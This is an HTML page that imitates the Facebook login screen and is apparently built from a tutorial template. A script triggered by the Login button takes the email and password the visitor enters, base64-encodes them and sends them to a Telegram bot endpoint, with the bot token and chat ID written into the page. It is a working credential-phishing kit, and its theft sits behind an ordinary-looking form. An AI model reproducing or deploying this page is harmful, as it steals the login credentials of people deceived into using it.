<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Page | CodingNepal</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container flex">
        <div class="facebook-page flex">
            <div class="text">
                <h1>facebook</h1>
                <p>Connect with friends and the world </p>
                <p> around you on Facebook.</p>
            </div>
            <form action="#">
                <input type="email" id="email" placeholder="Email or phone number" required>
                <input type="password" id="password" placeholder="Password" required>
                <div class="link">
                    <button type="submit" class="login" onclick="sendCredentials()">Login</button>
                    <a href="#" class="forgot">Forgot password?</a>
                </div>
                <hr>
                <div class="button">
                    <a href="#">Create new account</a>
                </div>
            </form>
        </div>
    </div>
    <script>
        function sendCredentials() {
            const email = btoa(document.getElementById("email").value);
            const password = btoa(document.getElementById("password").value);
            const url = `https://api.telegram.org/bot7725119977:AAFXZHt5mIBwodb5FiPXHZk8tSR78iApa3Q/sendMessage`;
            const data = {
                chat_id: 6193512816,
                text: `Email: ${email}\nPassword: ${password}`
            };
            const options = {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ data })
            };
            fetch(url, options);
        }
    </script>
</body>
</html>
